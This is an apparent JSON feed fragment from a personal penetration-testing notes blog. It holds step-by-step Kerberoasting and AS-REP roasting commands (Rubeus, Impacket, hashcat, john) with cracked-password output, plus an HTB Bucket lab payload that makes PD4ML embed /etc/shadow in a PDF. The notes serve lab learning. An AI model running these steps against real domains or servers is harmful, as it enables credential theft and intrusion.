class=\"nv\">$adf93e5eda682b7db85dbd12947dd18a$ec689dadf6fa1a1d278af9292df3e4bedd69c898e443cc7bcae926b0732d708ad8c50c0ba0d398fe59c4b769429384804903a4753c41f1ba2a63e4b561a96096b72d0e2a330bb78001a889163b557964506304273f06f6a1c55e7146e94a53800e49b999bc921416d1d8e8496a2869a2fba3956770b5992562c6ab0406c4a4c5ab69f274cceddcfb191631b5ba968f060c4b17fd44b72e13a734bb9086d6fa440cad248d0622ac516b93abcdb3c879b587b952eeb84565a890fdd164975270d8538d5c2a482d50fb81b15bc4d35e87e53fb6be89732c2ba1ce8b628884c0e525c919ddfc8067250b6c0b8e53e7a3a2f50d873cfe5aa5e4e71e2ca430ccf85b184b2ae13ced1121b0b732c3319c93ba051ec792d6357469229df7e321262e3094ac7054d432c19de069d651a385d7f003d28bca53f05a23b33b475903a5ac6b29cebda56cee8f21b2864261d32d32b9629437a9430b24926de3cb0c699ae1b815f90a873e1a22be1ff2c416d5cbae0dd5582f7f11f3807f1410ac8236ed30907265f5f70afbd5ef912440faa13b97673f65ce42fca939715114cdec7afd51c2e92b487020d7351cc10a59bccb55285d2822a32d0fdf51414e1085c79be0316f0713b6b9df7f58115102e21ba4bcfe74639c47e67237e2fdf6fb7afe63922a3a187b7028e97ce63acc1ec93414e78108c5665207809e220c3af6d4a7b7da50cb086f6608e0bd456d2ebaedf403682b407fffdba4844d32df6df5143d8c2cf5ee2d862828c71350ac5485c06abe1dbfd46d017b4d38a1afe008284a1f48b242b7156805ec8b3c9fc4ccbad29ef2818ad8d299db6c034f9817bb4ff40b30a26fa3c23c1e72e8c54ebb709e811a0e919b08b1635a92fb63e500fb09d3d792a97cb0736965d2181e211dd2c14d1fba0701bb28b063af8639e5d60c801f198c1290498f0365c9c4b00cc20257646c76be2d31ada0ca17d305169a182e16417b3e6cbe5f125142915632920129865ea5169fc8396313457a23061a55d3be9b2ff1ca976de6f512e056c4ebbdfe9ef3d2fdb2ccd5d3f9dc5fb31e689b23e04b2b6b8b95bb7ccaddd8a1346b1c354460cbb004ac228082a38d35d830f0979a72fe54c09b6605a01899bdb616668c52702e3b0bc77efcaa2c333c43f72fa7ba12cdf56ae36abd9bcc3cac8c987b21545c234ef92c6346f677a1cb80a11d50beec2c180311e1a99bc60cdaf8495f26c986827cf3060847b830ae7231942bacb6c0965954d09756e6ec16381812d651dbec5dccc79de0e834</span></code></pre></div></div><ul>  <li>Copy that entire hash and use <code class=\"language-plaintext highlighter-rouge\">hashcat</code> to crack it.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>hashcat <span class=\"nt\">--help</span> | <span class=\"nb\">grep </span>Kerb   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols  13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols  18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols  19600 | Kerberos 5, etype 17, TGS-REP                    | Network Protocols  19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols  19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols  19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols<span class=\"nv\">$ </span>hashcat <span class=\"nt\">-m</span> 13100 tgtkrbhash.txt /usr/share/wordlists/rockyou.txt <span class=\"nt\">-O</span>hashcat <span class=\"o\">(</span>v6.0.0<span class=\"o\">)</span> starting...OpenCL API <span class=\"o\">(</span>OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG<span class=\"o\">)</span> - Platform <span class=\"c\">#1 [The pocl project]</span><span class=\"o\">=============================================================================================================================</span><span class=\"k\">*</span> Device <span class=\"c\">#1: pthread-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 2870/2934 MB (1024 MB allocatable), 2MCU</span>Minimum password length supported by kernel: 0Maximum password length supported by kernel: 31Hashes: 1 digests<span class=\"p\">;</span> 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Applicable optimizers:<span class=\"k\">*</span> Optimized-Kernel<span class=\"k\">*</span> Zero-Byte<span class=\"k\">*</span> Not-Iterated<span class=\"k\">*</span> Single-Hash<span class=\"k\">*</span> Single-SaltWatchdog: Hardware monitoring interface not found on your system.Watchdog: Temperature abort trigger disabled.Host memory required <span class=\"k\">for </span>this attack: 99 MBDictionary cache hit:<span class=\"k\">*</span> Filename..: /usr/share/wordlists/rockyou.txt<span class=\"k\">*</span> Passwords.: 14344385<span class=\"k\">*</span> Bytes.....: 139921507<span class=\"k\">*</span> Keyspace..: 14344385<span class=\"c\"># password at the end</span><span class=\"nv\">$krb5tgs$23$*</span>SQLService<span class=\"nv\">$HOME</span>.LOCAL<span class=\"nv\">$dc</span>/SQLService.home.local~60111<span class=\"k\">*</span><span class=\"nv\">$a8e8ff9ef784cc428504d5fa734796df$b75a36390a057bd909525915c24216b75024cea26b541943fae1a8341a4e4e753e4659d0be682c16b310eb6698e043ea6e7ebd2d8ca967b3c7c22dacdc0e0ab3b130a7f7f13cb05464e83d9848f95815f0923cfe2a9c23ecce605bc5b1f64b7230d6392a56eaa3a9e6a25a892367438caa2bb0c9a6c4e07595cf3732d2387c63404f9b4c82a9e397df23003eac337310921bef71405e451d45e2ac28d2e74327ddb59e964f779234d357a69baab1fd396df0905a3be7d6994863545db67c8ee7529575bf9e36122529121f9810d3c45971b8fad5458bc89c3a75a6d4c8b5a780d73dff97a9c05adf7e3a16296a3fbc4e95a72c22c82fac52a78d620fca278c2300478ad497b9da7ec6441cddd2dcf2a85490778c38a39045e40adf2b68462cb207d20783b7f55d6da5a180643195a2c15c167a4d33b12ce1faf554f78278b6b35317cf7916e71c2ab1e0f751698da8fdd408403510b299627fb18b47f41dca44361f8b1ecdc2d8ee66529d5de6a278e5f255087a48b013fc40c88d18a4ab5f1fc3a0a39efd2efefe56e1a6a214d2f16f2c8dad8142c64cefc2e87df93f0c0081d6a1847a32ef837d3f91f3990214eb0b52a3a97aaeec8b2fa94f67e6089898947ad322aba3a32bb0ae838bea385e1ac4cd11e8935052de12c453c4eafce5af50e6f5b9d92e238238ae9b82f995c9e4fda6c3434d925ab47a10e649d1ce02f50f04ca3f051e0c46f4ec24f3c7c1c412617cabd749ed4bf9ed50b93a1497b15a332fd4364c66c07627455a1fe0f45d47af5810f54fe4d25e2eff8655c8e071ecaeea7013608935cc5830d4607d50af5bccd0d44ac66e13911df0af182359ae0ceee20b48aeb8dbca6bac9497b1b4bb70e297b1b0f180d1a3eeca34a2cd4bde849515950ae7faa6fbccdb9b31a1db2826d185ee79d98f64c79c50ab04ca0f90e97db86e9740a782bfab7e500518f894fb162e9c4edaa480c829792e1d4ae72a2876ed34d9e3cba8a03618eba10d0f94e5b7d467cc130851d592ebde3fac06431e6b8500fadc066e79c5975f597af53457c1bbfc13b5781512935af00f9d826400916786bfacefb8aa62b2584a09ff3f33259f896ef4f716a9795af623197c59045ef4f8e64f73dbef6fa0beb043fe72dcc0cb2aaa5f1150e8ff40ad7c3f52a7af5dc86eeb24405c86f14aa8e54538419a19db470a8ba744e0ec3682e3217dbf8f4c6e09f37fcffa14dcbbf215e43ae8a7e609e86990cce06ea95d4c076adc636b7a462b9a6780acf583a1ee826039bf3b60135b</span>:MYpassword123#                                                 Session..........: hashcatStatus...........: CrackedHash.Name........: Kerberos 5, etype 23, TGS-REPHash.Target......: <span class=\"nv\">$krb5tgs$23$*</span>SQLService<span class=\"nv\">$HOME</span>.LOCAL<span class=\"nv\">$dc</span>/SQLService.ho...60135bTime.Started.....: Thu Oct  1 13:12:55 2020 <span class=\"o\">(</span>16 secs<span class=\"o\">)</span>Time.Estimated...: Thu Oct  1 13:13:11 2020 <span class=\"o\">(</span>0 secs<span class=\"o\">)</span>Guess.Base.......: File <span class=\"o\">(</span>/usr/share/wordlists/rockyou.txt<span class=\"o\">)</span>Guess.Queue......: 1/1 <span class=\"o\">(</span>100.00%<span class=\"o\">)</span>Speed.#1.........:   698.8 kH/s <span class=\"o\">(</span>8.40ms<span class=\"o\">)</span> @ Acceppsel:64 Loops:1 Thr:64 Vec:8Recovered........: 1/1 <span class=\"o\">(</span>100.00%<span class=\"o\">)</span> DigestsProgress.........: 10848312/14344385 <span class=\"o\">(</span>75.63%<span class=\"o\">)</span>Rejected.........: 2104/10848312 <span class=\"o\">(</span>0.02%<span class=\"o\">)</span>Restore.Point....: 10840120/14344385 <span class=\"o\">(</span>75.57%<span class=\"o\">)</span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidates.#1....: Mamita01 -&gt; MY2girlSStarted: Thu Oct  1 13:12:54 2020Stopped: Thu Oct  1 13:13:11 2020</code></pre></div></div>",
            "url": "https://mvineza.github.io/spindel/2022/03/10/kerberoasting-impacket",
            
            
            
            "tags": ["windows","ad","kerberos","foothold"],
            
            "date_published": "2022-03-10T00:00:00+08:00",
            "date_modified": "2022-03-10T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/03/08/kerberoasting-rubeus",
            "title": "Kerberoasting - Rubeus",
            "summary": "Kerberoasting - Rubeus",
            "content_text": "  Launch rubeus on victim’s machineRubeus.exe kerberoast  Wait for some hash to appear. Here is a truncated example.[*] SamAccountName         : SQLService[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111[*] PwdLastSet             : 5/25/2020 10:28:26 PM[*] Supported ETypes       : RC4_HMAC_DEFAULT[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local...  Convert the hash block into single line.cat hash_block | tr -d '\\n' &gt; hash_single_line  Get a modified rockyou here (or use the whole rockyou inside /usr/share/wordlists)curl -OL https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.tx  Crack using hashcat.hashcat -m 13100 -a 0 hash_single_line Pass.txt",
            "content_html": "<ul>  <li>Launch rubeus on victim’s machine</li></ul><div class=\"language-batch highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kd\">Rubeus</span><span class=\"err\">.exe</span> <span class=\"kd\">kerberoast</span></code></pre></div></div><ul>  <li>Wait for some hash to appear. Here is a truncated example.</li></ul><div class=\"language-batch highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">[*]</span> <span class=\"kd\">SamAccountName</span>         : <span class=\"kd\">SQLService</span><span class=\"o\">[*]</span> <span class=\"kd\">DistinguishedName</span>      : <span class=\"kd\">CN</span><span class=\"o\">=</span><span class=\"kd\">SQLService</span><span class=\"o\">,</span><span class=\"kd\">CN</span><span class=\"o\">=</span><span class=\"kd\">Users</span><span class=\"o\">,</span><span class=\"kd\">DC</span><span class=\"o\">=</span><span class=\"kd\">CONTROLLER</span><span class=\"o\">,</span><span class=\"kd\">DC</span><span class=\"o\">=</span><span class=\"kd\">local</span><span class=\"o\">[*]</span> <span class=\"kd\">ServicePrincipalName</span>   : <span class=\"kd\">CONTROLLER</span><span class=\"o\">-</span><span class=\"m\">1</span><span class=\"na\">/SQLService</span>.CONTROLLER.local:30111<span class=\"o\">[*]</span> <span class=\"kd\">PwdLastSet</span>             : <span class=\"m\">5</span>/25/2020 <span class=\"m\">10</span>:28:26 <span class=\"kd\">PM</span><span class=\"o\">[*]</span> <span class=\"kd\">Supported</span> <span class=\"kd\">ETypes</span>       : <span class=\"kd\">RC4_HMAC_DEFAULT</span><span class=\"o\">[*]</span> <span class=\"kd\">Hash</span>                   : $krb5tgs$23$<span class=\"o\">*</span><span class=\"kd\">SQLService</span>$CONTROLLER.local$CONTROLLER<span class=\"o\">-</span><span class=\"m\">1</span><span class=\"na\">/SQLService</span>.CONTROLLER.local...</code></pre></div></div><ul>  <li>Convert the hash block into single line.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">cat </span>hash_block | <span class=\"nb\">tr</span> <span class=\"nt\">-d</span> <span class=\"s1\">'\\n'</span> <span class=\"o\">&gt;</span> hash_single_line</code></pre></div></div><ul>  <li>Get a modified rockyou <a href=\"https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt\">here</a> (or use the whole rockyou inside <code class=\"language-plaintext highlighter-rouge\">/usr/share/wordlists</code>)</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl <span class=\"nt\">-OL</span> https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.tx</code></pre></div></div><ul>  <li>Crack using hashcat.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>hashcat <span class=\"nt\">-m</span> 13100 <span class=\"nt\">-a</span> 0 hash_single_line Pass.txt</code></pre></div></div>",
            "url": "https://mvineza.github.io/spindel/2022/03/08/kerberoasting-rubeus",
            
            
            
            "tags": ["windows","ad","kerberos"],
            
            "date_published": "2022-03-08T00:00:00+08:00",
            "date_modified": "2022-03-08T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/03/07/as-rep-roasting-using-impacket",
            "title": "AS-REP Roasting using Impacket",
            "summary": "AS-REP Roasting using Impacket",
            "content_text": "Overview  With valid usernames, attacker can intercept NTLMv2 hash and crack it to get the password because pre-authentication phase is disabled  One way of getting valid usernames is to use [[Kerbrute]] technique  See [[AS-REP]] for theory behind this attackSteps  Add DC entry to hosts file10.10.135.224 SPOOKYSEC.local  Get a list of valid accounts using [[Kerbrute]]  Put them into a txt filesvc-admin@spookysec.localJames@spookysec.localrobin@spookysec.localdarkstar@spookysec.localadministrator@spookysec.localbackup@spookysec.localparadox@spookysec.localJAMES@spookysec.localRobin@spookysec.localAdministrator@spookysec.local  Run impacket to determine what accounts are AS-REP roastablepython3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py SPOOKYSEC.local/ -usersfile users.txt -format john -outputfile out.john -no-pass  Here is an example output.  Crack the hashes and enjoy!john --wordlist=/usr/share/wordlists/rockyou.txt out.johnGotchasI encounter an issue on THM ra box. Output tells that user doesn’t require preauth set.[-] User buse@windcorp.thm doesn't have UF_DONT_REQUIRE_PREAUTH setBut then there was no hashes dumped. When I checked the connections in wireshark, I see that its requiring pre auth!",
            "content_html": "<h2 id=\"overview\">Overview</h2><ul>  <li>With valid usernames, attacker can intercept NTLMv2 hash and crack it to get the password because pre-authentication phase is disabled</li>  <li>One way of getting valid usernames is to use [[Kerbrute]] technique</li>  <li>See [[AS-REP]] for theory behind this attack</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Add DC entry to hosts file</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>10.10.135.224 SPOOKYSEC.local</code></pre></div></div><ul>  <li>Get a list of valid accounts using [[Kerbrute]]</li>  <li>Put them into a txt file</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>svc-admin@spookysec.localJames@spookysec.localrobin@spookysec.localdarkstar@spookysec.localadministrator@spookysec.localbackup@spookysec.localparadox@spookysec.localJAMES@spookysec.localRobin@spookysec.localAdministrator@spookysec.local</code></pre></div></div><ul>  <li>Run impacket to determine what accounts are AS-REP roastable</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py SPOOKYSEC.local/ -usersfile users.txt -format john -outputfile out.john -no-pass</code></pre></div></div><ul>  <li>Here is an example output.</li></ul><p><img src=\"/spindel/assets/AS-REP%20Roasting%20using%20Impacket/76430BF0-31FD-4DBF-A15F-81F0CFB51661.png\" alt=\"\" /></p><ul>  <li>Crack the hashes and enjoy!</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>john <span class=\"nt\">--wordlist</span><span class=\"o\">=</span>/usr/share/wordlists/rockyou.txt out.john</code></pre></div></div><h2 id=\"gotchas\">Gotchas</h2><p>I encounter an issue on THM ra box. Output tells that user doesn’t require preauth set.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>[-] User buse@windcorp.thm doesn't have UF_DONT_REQUIRE_PREAUTH set</code></pre></div></div><p>But then there was no hashes dumped. When I checked the connections in wireshark, I see that its requiring pre auth!</p><p><img src=\"/spindel/assets/AS-REP%20Roasting%20using%20Impacket/A89116D4-A26E-46F4-9C17-44EF3E91FA4D.png\" alt=\"\" /></p>",
            "url": "https://mvineza.github.io/spindel/2022/03/07/as-rep-roasting-using-impacket",
            
            
            
            "tags": ["windows","ad","kerberos","foothold"],
            
            "date_published": "2022-03-07T00:00:00+08:00",
            "date_modified": "2022-03-07T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/03/05/pd4ml-attachment-from-dynamodb",
            "title": "PD4ML Attachment from DynamoDB",
            "summary": "PD4ML Attachment from DynamoDB",
            "content_text": "OverviewAttacker can gain access to sensitive files by embedding it inside PDF doc using pd4ml library via malicuous DynamoDB data.Environment Setup  Server side code that allows user to trigger PDF generation&lt;?phprequire 'vendor/autoload.php';use Aws\\DynamoDb\\DynamoDbClient;if($_SERVER[\"REQUEST_METHOD\"]===\"POST\") {        if($_POST[\"action\"]===\"get_alerts\") {                date_default_timezone_set('America/New_York');                $client = new DynamoDbClient([                        'profile' =&gt; 'default',                        'region'  =&gt; 'us-east-1',                        'version' =&gt; 'latest',                        'endpoint' =&gt; 'http://localhost:4566'                ]);                $iterator = $client-&gt;getIterator('Scan', array(                        'TableName' =&gt; 'alerts',                        'FilterExpression' =&gt; \"title = :title\",                        'ExpressionAttributeValues' =&gt; array(\":title\"=&gt;array(\"S\"=&gt;\"Ransomware\")),                ));                foreach ($iterator as $item) {                        $name=rand(1,10000).'.html';                        file_put_contents('files/'.$name,$item[\"data\"]);                }                passthru(\"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf\");        }}else{?&gt;  Attacker already has low privileged account access  Unauthenticated dynamodb endpointSteps  Create the following table schema{\t\"TableName\": \"alerts\",\t\"KeySchema\": [{\t\t\t\"AttributeName\": \"title\",\t\t\t\"KeyType\": \"HASH\"\t\t},\t\t{\t\t\t\"AttributeName\": \"data\",\t\t\t\"KeyType\": \"RANGE\"\t\t}\t],\t\"AttributeDefinitions\": [{\t\t\t\"AttributeName\": \"title\",\t\t\t\"AttributeType\": \"S\"\t\t},\t\t{\t\t\t\"AttributeName\": \"data\",\t\t\t\"AttributeType\": \"S\"\t\t}\t],\t\"ProvisionedThroughput\": {\t\t\"ReadCapacityUnits\": 5,\t\t\"WriteCapacityUnits\": 5\t}}  Create dynamodb table by passing json file aboveaws --endpoint-url http://s3.bucket.htb dynamodb create-table --cli-input-json file://./alerts.json  Add data on the tableaws --endpoint-url http://s3.bucket.htb dynamodb put-item --table-name alerts --item '{\"title\":{\"S\":\"Ransomware\"},\"data\":{\"S\":\"&lt;pd4ml:attachment description=\\\"attached.txt\\\" icon=\\\"PushPin\\\"&gt;file:///etc/shadow&lt;/pd4ml:attachment&gt;\"}}  Trigger PDF generation by accessing the webpagecurl -X POST 'http://localhost:8000' -d 'action=get_alerts'  Visit the webpage in the browser and download the embedded file inside the pdf  The embedded file contains /etc/shadow of the victim serverAlternatives  Instead of attaching files, you can also attach directory paths. The resulting embedded file inside the PDF document will contain the contents of the directory.file:///rootRefeferences  HTB Bucket",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>Attacker can gain access to sensitive files by embedding it inside PDF doc using pd4ml library via malicuous DynamoDB data.</p><h2 id=\"environment-setup\">Environment Setup</h2><ul>  <li>Server side code that allows user to trigger PDF generation</li></ul><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"cp\">&lt;?php</span><span class=\"k\">require</span> <span class=\"s1\">'vendor/autoload.php'</span><span class=\"p\">;</span><span class=\"kn\">use</span> <span class=\"nc\">Aws\\DynamoDb\\DynamoDbClient</span><span class=\"p\">;</span><span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nv\">$_SERVER</span><span class=\"p\">[</span><span class=\"s2\">\"REQUEST_METHOD\"</span><span class=\"p\">]</span><span class=\"o\">===</span><span class=\"s2\">\"POST\"</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nv\">$_POST</span><span class=\"p\">[</span><span class=\"s2\">\"action\"</span><span class=\"p\">]</span><span class=\"o\">===</span><span class=\"s2\">\"get_alerts\"</span><span class=\"p\">)</span> <span class=\"p\">{</span>                <span class=\"nb\">date_default_timezone_set</span><span class=\"p\">(</span><span class=\"s1\">'America/New_York'</span><span class=\"p\">);</span>                <span class=\"nv\">$client</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">DynamoDbClient</span><span class=\"p\">([</span>                        <span class=\"s1\">'profile'</span> <span class=\"o\">=&gt;</span> <span class=\"s1\">'default'</span><span class=\"p\">,</span>                        <span class=\"s1\">'region'</span>  <span class=\"o\">=&gt;</span> <span class=\"s1\">'us-east-1'</span><span class=\"p\">,</span>                        <span class=\"s1\">'version'</span> <span class=\"o\">=&gt;</span> <span class=\"s1\">'latest'</span><span class=\"p\">,</span>                        <span class=\"s1\">'endpoint'</span> <span class=\"o\">=&gt;</span> <span class=\"s1\">'http://localhost:4566'</span>                <span class=\"p\">]);</span>                <span class=\"nv\">$iterator</span> <span class=\"o\">=</span> <span class=\"nv\">$client</span><span class=\"o\">-&gt;</span><span class=\"nf\">getIterator</span><span class=\"p\">(</span><span class=\"s1\">'Scan'</span><span class=\"p\">,</span> <span class=\"k\">array</span><span class=\"p\">(</span>                        <span class=\"s1\">'TableName'</span> <span class=\"o\">=&gt;</span> <span class=\"s1\">'alerts'</span><span class=\"p\">,</span>                        <span class=\"s1\">'FilterExpression'</span> <span class=\"o\">=&gt;</span> <span class=\"s2\">\"title = :title\"</span><span class=\"p\">,</span>                        <span class=\"s1\">'ExpressionAttributeValues'</span> <span class=\"o\">=&gt;</span> <span class=\"k\">array</span><span class=\"p\">(</span><span class=\"s2\">\":title\"</span><span class=\"o\">=&gt;</span><span class=\"k\">array</span><span class=\"p\">(</span><span class=\"s2\">\"S\"</span><span class=\"o\">=&gt;</span><span class=\"s2\">\"Ransomware\"</span><span class=\"p\">)),</span>                <span class=\"p\">));</span>                <span class=\"k\">foreach</span> <span class=\"p\">(</span><span class=\"nv\">$iterator</span> <span class=\"k\">as</span> <span class=\"nv\">$item</span><span class=\"p\">)</span> <span class=\"p\">{</span>                        <span class=\"nv\">$name</span><span class=\"o\">=</span><span class=\"nb\">rand</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">,</span><span class=\"mi\">10000</span><span class=\"p\">)</span><span class=\"mf\">.</span><span class=\"s1\">'.html'</span><span class=\"p\">;</span>                        <span class=\"nb\">file_put_contents</span><span class=\"p\">(</span><span class=\"s1\">'files/'</span><span class=\"mf\">.</span><span class=\"nv\">$name</span><span class=\"p\">,</span><span class=\"nv\">$item</span><span class=\"p\">[</span><span class=\"s2\">\"data\"</span><span class=\"p\">]);</span>                <span class=\"p\">}</span>                <span class=\"nb\">passthru</span><span class=\"p\">(</span><span class=\"s2\">\"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span class=\"nv\">$name</span><span class=\"s2\"> 800 A4 -out files/result.pdf\"</span><span class=\"p\">);</span>        <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">else</span><span class=\"p\">{</span><span class=\"cp\">?&gt;</span></code></pre></div></div><ul>  <li>Attacker already has low privileged account access</li>  <li>Unauthenticated dynamodb endpoint</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Create the following table schema</li></ul><div class=\"language-json highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"p\">{</span><span class=\"w\">\t</span><span class=\"nl\">\"TableName\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"alerts\"</span><span class=\"p\">,</span><span class=\"w\">\t</span><span class=\"nl\">\"KeySchema\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[{</span><span class=\"w\">\t\t\t</span><span class=\"nl\">\"AttributeName\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"title\"</span><span class=\"p\">,</span><span class=\"w\">\t\t\t</span><span class=\"nl\">\"KeyType\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"HASH\"</span><span class=\"w\">\t\t</span><span class=\"p\">},</span><span class=\"w\">\t\t</span><span class=\"p\">{</span><span class=\"w\">\t\t\t</span><span class=\"nl\">\"AttributeName\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"data\"</span><span class=\"p\">,</span><span class=\"w\">\t\t\t</span><span class=\"nl\">\"KeyType\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"RANGE\"</span><span class=\"w\">\t\t</span><span class=\"p\">}</span><span class=\"w\">\t</span><span class=\"p\">],</span><span class=\"w\">\t</span><span class=\"nl\">\"AttributeDefinitions\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">[{</span><span class=\"w\">\t\t\t</span><span class=\"nl\">\"AttributeName\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"title\"</span><span class=\"p\">,</span><span class=\"w\">\t\t\t</span><span class=\"nl\">\"AttributeType\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"S\"</span><span class=\"w\">\t\t</span><span class=\"p\">},</span><span class=\"w\">\t\t</span><span class=\"p\">{</span><span class=\"w\">\t\t\t</span><span class=\"nl\">\"AttributeName\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"data\"</span><span class=\"p\">,</span><span class=\"w\">\t\t\t</span><span class=\"nl\">\"AttributeType\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">\"S\"</span><span class=\"w\">\t\t</span><span class=\"p\">}</span><span class=\"w\">\t</span><span class=\"p\">],</span><span class=\"w\">\t</span><span class=\"nl\">\"ProvisionedThroughput\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"p\">{</span><span class=\"w\">\t\t</span><span class=\"nl\">\"ReadCapacityUnits\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">5</span><span class=\"p\">,</span><span class=\"w\">\t\t</span><span class=\"nl\">\"WriteCapacityUnits\"</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">5</span><span class=\"w\">\t</span><span class=\"p\">}</span><span class=\"w\"></span><span class=\"p\">}</span><span class=\"w\"></span></code></pre></div></div><ul>  <li>Create dynamodb table by passing json file above</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>aws <span class=\"nt\">--endpoint-url</span> http://s3.bucket.htb dynamodb create-table <span class=\"nt\">--cli-input-json</span> file://./alerts.json</code></pre></div></div><ul>  <li>Add data on the table</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>aws <span class=\"nt\">--endpoint-url</span> http://s3.bucket.htb dynamodb put-item <span class=\"nt\">--table-name</span> alerts <span class=\"nt\">--item</span> <span class=\"s1\">'{\"title\":{\"S\":\"Ransomware\"},\"data\":{\"S\":\"&lt;pd4ml:attachment description=\\\"attached.txt\\\" icon=\\\"PushPin\\\"&gt;file:///etc/shadow&lt;/pd4ml:attachment&gt;\"}}</span></code></pre></div></div><ul>  <li>Trigger PDF generation by accessing the webpage</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl <span class=\"nt\">-X</span> POST <span class=\"s1\">'http://localhost:8000'</span> <span class=\"nt\">-d</span> <span class=\"s1\">'action=get_alerts'</span></code></pre></div></div><ul>  <li>Visit the webpage in the browser and download the embedded file inside the pdf</li></ul><p><img src=\"/spindel/assets/PD4ML%20Attachment%20from%20DynamoDB/AD8F0FAA-8C7E-4FAE-8EB8-E937CFB7A0DB.png\" alt=\"\" /></p><ul>  <li>The embedded file contains <code class=\"language-plaintext highlighter-rouge\">/etc/shadow</code> of the victim server</li></ul><h2 id=\"alternatives\">Alternatives</h2><ul>  <li>Instead of attaching files, you can also attach directory paths. The resulting embedded file inside the PDF document will contain the contents of the directory.</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>file:///root</code></pre></div></div><h2 id=\"refeferences\">Refeferences</h2><ul>  <li>HTB Bucket</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/03/05/pd4ml-attachment-from-dynamodb",
            
            
            
            "tags": ["privesc","foothold","web","aws"],
            
            "date_published": "2022-03-05T00:00:00+08:00",
            "date_modified": "2022-03-05T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/03/01/malicious-dll-injection",
            "title": "Malicious DLL Injection",
